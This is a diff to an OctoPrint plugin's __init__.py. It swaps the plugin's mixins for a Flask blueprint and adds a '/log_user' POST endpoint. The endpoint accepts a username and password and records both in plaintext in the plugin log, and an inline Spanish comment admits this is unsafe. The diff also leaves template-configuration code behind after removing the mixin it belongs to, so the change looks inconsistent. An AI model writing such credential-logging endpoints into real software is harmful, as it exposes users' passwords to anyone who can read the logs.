@@ -1,6 +1,6 @@
 # coding=utf-8
 from __future__ import absolute_import
-
+from flask import request, jsonify
 ### (Don't forget to remove me)
 # This is a basic skeleton for your plugin's __init__.py. You probably want to adjust the class name of your plugin
 # as well as the plugin mixins it's subclassing from. This is really just a basic skeleton to get you started,
@@ -11,10 +11,15 @@ from __future__ import absolute_import
 
 import octoprint.plugin
 
-class AutomakerPlugin(octoprint.plugin.SettingsPlugin,
-    octoprint.plugin.AssetPlugin,
-    octoprint.plugin.TemplatePlugin
-):
+class AutomakerPlugin(octoprint.plugin.BlueprintPlugin):
+
+    @octoprint.plugin.BlueprintPlugin.route("/log_user", methods=["POST"])
+    def log_user(self):
+        data = request.json
+        username = data.get("username", "Unknown")
+        password = data.get("password", "Unknown")  # No es seguro registrar contraseñas reales
+        self._logger.info(f"User login attempted: Username: {username}, Password: {password}")
+        return jsonify({"status": "success", "message": "User login logged!"})
 ##~~ TemplatePlugin mixin
 
     def get_template_configs(self):
